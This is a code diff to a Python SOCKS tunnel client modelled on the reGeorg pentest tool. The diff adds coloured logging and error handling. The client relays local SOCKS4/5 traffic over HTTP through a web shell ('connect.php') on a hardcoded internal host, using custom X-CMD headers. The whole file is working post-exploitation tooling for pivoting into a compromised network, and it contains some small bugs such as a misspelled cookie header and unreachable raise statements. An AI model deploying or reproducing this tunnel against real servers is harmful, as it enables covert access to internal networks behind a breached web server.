@@ -6,23 +6,87 @@ import socket
 from urllib import parse
 import urllib3
 from threading import Thread
+import logging
 import time
 import sys
+import logging
 
 # 不知怎么的，此脚本很慢。实际的话，需要进行优化
 
+# constants
 BASICCHECKSTRING = "Georg says, 'All seems fine'"
 READBUFSIZE = 1024
 VER = '\x05'
 METHOD = '\x00'
+
 # READ_TIMES = 0        # 统计响应次数和请求次数
 # WRITE_TIMES = 0
 
+# logging
+LOGSTART = '\x1b[{}m'
+LOGEND = '\x1b[0m'
+LOG_MELODY = '\x1b[5m'
 
-# this is a demo for reGeory client 
-# 如果变量为byted类型的话，那么使用迭代的方式来取的话，会自动的转化为十进制。
-# x = b'\x34\x35\x36'
-# print(x[2])       # 此处自动的输出54
+BLACK, RED, GREEN, YELLOW, BLUE, PERPLE, LITTILE_BLUE, WRITE = range(30,38)
+LOGLEVEL = "INFO"
+
+COLOR_LIST = {
+    'CRITICAL':RED,
+    'ERROR':YELLOW,
+    'WARNING':LITTILE_BLUE,
+    'INFO':PERPLE,
+    "DEBUG":GREEN
+
+}
+
+
+class FormatLogger(logging.Formatter):
+    def __init__(self, msg, use_color=True):
+        logging.Formatter.__init__(self, msg)
+        self.use_color = use_color
+
+    def format(self, record):
+        level_name = record.levelname
+
+
+        if self.use_color and level_name in COLOR_LIST:
+            result = LOGSTART.format(COLOR_LIST[level_name]) + level_name + LOGEND
+
+        if record.name == 'melody':
+            result = LOG_MELODY + LOGSTART.format(COLOR_LIST['CRITICAL']) + level_name + LOGEND
+
+        record.levelname = result
+        return logging.Formatter.format(self, record)
+
+class MainLogger(logging.Logger):
+    
+    def __init__(self,name):
+        logging.Logger.__init__(self, name, LOGLEVEL)
+        format_msg = "[%(levelname)s]  %(message)s"
+
+        msg_format = FormatLogger(format_msg)
+        console = logging.StreamHandler()
+        console.setFormatter(msg_format)
+
+        self.addHandler(console)
+        return
+
+logging.setLoggerClass(MainLogger)
+
+log = logging.getLogger('log')
+melody = logging.getLogger('melody')
+
+
+
+
+
+
+
+
+
+class SocksProtocolNotImplemented(Exception):
+    pass
+
 
 
 class Session(Thread):
@@ -52,22 +116,22 @@ class Session(Thread):
     def run(self):
         
         if self.handleSocks(self.Psocket):
-            print("握手成功")
+            log.info('[ {}:{} ] shake hands is OK  '.format(self.target,self.target_port))
             # r = gevent.spawn(self.reader)        # 先拉取数据
             # gevent.joinall([gevent.spawn(self.reader)])
 
             # w = gevent.spawn(self.writer)        # 此处将多线程修改为协程
             gevent.joinall([gevent.spawn(self.reader),gevent.spawn(self.writer)])       # 将原本的多线程修改为协程
-            r.join()
-            w.join()
-
+            # r.join()
+            # w.join()
+            log.warning('[ {}:{} ] the socket connect is over  '.format(self.target,self.target_port))
 
     def reader(self):
         # global READ_TIMES
         conn = urllib3.PoolManager()
         while True:
             try:
-                if not self.Psocket:exit("连接中断，退出")
+                if not self.Psocket: raise SocksProtocolNotImplemented('连接结束，退出')
                 headers = {
                     "X-CMD":"READ",
                     "Cookie":self.cookie,
@@ -81,33 +145,39 @@ class Session(Thread):
                             pass
                         
                     else:
-                        exit("reader的x-status状态不为ok，退出")
+                        break
+                        raise SocksProtocolNotImplemented("服务端已经关闭连接，退出")
+                        
                 else:
-                    exit("reader的响应状态码不为200，退出")        
+                    raise SocksProtocolNotImplemented("服务端状态异常，响应状态码不为200，退出")   
+                    break    
                 if len(data) == 0:
                     time.sleep(0.1)
                     continue
+                else:
+                    melody.critical(' [ {}:{}] recv \x1b[5m\x1b[33m<<<\x1b[0m {}'.format(self.target,self.target_port,len(data)))
                 self.Psocket.sendall(data)
                 # READ_TIMES += 1       
                 # print("响应次数为：",READ_TIMES)
             except Exception as identifier:
-                print("读取出错")
+                print(identifier)
 
 
     def writer(self):
         # global WRITE_TIMES
-        print("进入写数据的函数中")
+        log.error('[ {}:{} ] sending data ... ... '.format(self.target,self.target_port))
         global READBUFSIZE
         conn = urllib3.PoolManager()
         while True:
             data = self.Psocket.recv(READBUFSIZE)
             if not data:
-                print("写入结束")
+                log.critical('[ {}:{} ] no data need to send to target '.format(self.target,self.target_port))
                 break
             # WRITE_TIMES += 1
             # print("写入次数为",WRITE_TIMES)
             headers = {"X-CMD":"FORWARD","Cookie":self.cookie,"Content-type":"application/octet-stream","Connection":"Keep-Alive"}
             response = conn.urlopen("POST",self.connect_string,headers=headers,body=data)
+            melody.critical(' [ {}:{}] send \x1b[5m\x1b[33m>>>\x1b[0m {}'.format(self.target,self.target_port,len(data)))
             # print("正在写入数据中：",data)
             if response.status == 200:
                 status = response.getheader("x-status")
@@ -115,9 +185,16 @@ class Session(Thread):
                     if response.getheader("set-sookie") is not None:
                         self.cookie = response.getheader("set-cookie")
                 else:
-                    print("服务端开起来貌似已经关闭")
+                    log.error('[ {}:{} ] remote server seem like error,x-status not ok  '.format(self.target,self.target_port))
+                    break
             else:
-                print("发送数据失败，目标无响应")
+                log.error('[ {}:{} ] remote server status_code is not 200 '.format(self.target,self.target_port))
+                break
+        self.closeSession()
+        try:
+            self.Psocket.close()
+        except:
+            log.error('[ {}:{} ] the socket is error  '.format(self.target,self.target_port))
         
 
         # 握手并且在服务端建立session
@@ -129,13 +206,15 @@ class Session(Thread):
         conn = self.http_scheme(host=self.http_host,port=self.http_port)
 
         response = conn.urlopen("POST",self.connect_string, headers=headers)
-        print(response.status)
+        log.error('[ {}:{} ] setuping the remote sessions ... ...  '.format(self.target,self.target_port))
         if response.status == 200:
             cookie = response.getheader("set-cookie")
-            print("保存的cookie为：",(cookie))
+            log.error('[ {}:{} ] the cookie is   '.format(self.target,self.target_port,cookie))
             if response.getheader("X-ERROR"):
-                print("状态为;",response.getheader("X-ERROR"))
-            print("请求头为：",headers)
+                log.error('[ {}:{} ] remote server is send X-ERROR like:{} '.format(self.target,self.target_port,response.getheaders("X-ERROR")))
+            log.error('[ {}:{} ] the setupsession() send request headers is {}  '.format(self.target,self.target_port,headers))
+        else:
+            raise SocksProtocolNotImplemented('与目标服务器建立连接失败')
         conn.close()
         return cookie
 
@@ -144,17 +223,17 @@ class Session(Thread):
         conn = self.http_scheme(host=self.http_host,port=self.http_port)
         r = conn.urlopen("POST",self.connect_string,headers=headers)
         if r.status == 200:
-            print("已经杀死链接")
+            log.critical('[ {}:{} ] send the closeSession '.format(self.target,self.target_port))
         conn.close()
 
 
 
     def socks_5(self,ss):
-        print("开启socks连接,默认不支持密码验证(ps.客户端密码验证没有意义)")
+        log.info('start the socks5 shake hands')
         handle_data_1 = ss.recv(1024)     # 接受剩余的字节
         ss.sendall(b'\x05\x00')         # 响应客户端使用免验证登录
         handle_data_2 = ss.recv(1024)
-        print(handle_data_2)
+        log.critical('recv the socks5 shake handls data like {}'.format(handle_data_2))
         if handle_data_2[0] != 5:exit('协议错误退出')
         if handle_data_2[1] != 1:print("不支持的方式,bind or udp，socks不支持. 退出")
         if handle_data_2[3] == 1:                       # 解析IP,           此处handle_data_2[3] 实际上为客户端确定的ipv4,域名，ipv6支持
@@ -162,9 +241,8 @@ class Session(Thread):
             target = ip
             port = handle_data_2[-2] *256 + handle_data_2[-1]       # 优化一下
             target_port = port 
-            print("目标IP为：",ip)
-            print("目标端口为",port)
-
+            
+            log.error('the target is {}:{}'.format(ip,port))
                     # 简单测试ip连接是否能够成功
             # ss.sendall(b'\x05\x00\x00\x01'+ handle_data_2[4:])                  # 后面的数据实际上就是相当于复制请求中的域名和port而已，所以此处直接复制即可
             # print("发送的数据为      ：",b'\x05\x00\x00\x01'+ handle_data_2[4:]) 
@@ -174,9 +252,7 @@ class Session(Thread):
             target = host_name
             port = handle_data_2[-2] *256 + handle_data_2[-1]       # 优化一下
             target_port = port
-            print("目标域名为：",host_name)
-            print("目标端口为：",port)  
-
+            log.error('the target is {}:{}'.format(host_name,port))
                     # 简单测试hostname连接是否能够成功
             # ss.sendall(b'\x05\x00\x00\x03'+ handle_data_2[4:])                   # 后面的数据实际上就是相当于复制请求中的域名和port而已，所以此处直接复制即可
             # print("发送的数据为：",b'\x05\x00\x00\x03'+ handle_data_2[4:])         
@@ -190,9 +266,13 @@ class Session(Thread):
             result = ":".join(result_list)
         
         self.cookie = self.setupSession(target,target_port)
-        if not self.cookie:exit('目标不可用，退出')
-        ss.sendall(b'\x05\x00\x00'+handle_data_2[3:])           # php服务端连接成功，向客户端发送连接成功的socks响应。接下来应该进入成功的请求
-        return True
+        if not self.cookie:
+            ss.sendall(b'\x05\x01\x00'+handle_data_2[3:])
+            raise SocksProtocolNotImplemented('连接不可用，退出')
+        else:
+            ss.sendall(b'\x05\x00\x00'+handle_data_2[3:])           # php服务端连接成功，向客户端发送连接成功的socks响应。接下来应该进入成功的请求
+            return True
+        return False
         
 
 
@@ -242,6 +322,8 @@ class Session(Thread):
             return self.socks_4(ss)
         elif socks_version == b"\x05":
             return self.socks_5(ss)
+        else :
+            raise SocksProtocolNotImplemented('connect is abnormal')
 
 
 
@@ -267,7 +349,7 @@ def askGeorg(ConnectString):
         httpConnect = urllib3.HTTPSConnectionPool
     conn = httpConnect(host = http_host,port = http_port)
     response = conn.request("GET",http_path)
-    print(response.status)
+    log.info('target is available')
     if response.status == 200:
         if response.data.strip().decode("utf-8") == BASICCHECKSTRING:
             return True
@@ -275,6 +357,7 @@ def askGeorg(ConnectString):
     return False
 
 if __name__ == "__main__":
+
 
     try:
         if not askGeorg("http://192.168.2.82/connect.php"):exit("目标不可用")
@@ -287,10 +370,7 @@ if __name__ == "__main__":
     s.listen(4)
     while True:
         ss,addr = s.accept()
-        print("远程地址为：",addr)
-        # askGeorg('http://192.168.2.82/connect.php')
-        
-        # the target is 
+        log.info('the client is {}'.format(str(addr[0])+':'+str(addr[1])))
         
         try:
             if not askGeorg("http://192.168.2.82/connect.php"):exit("目标不可用")
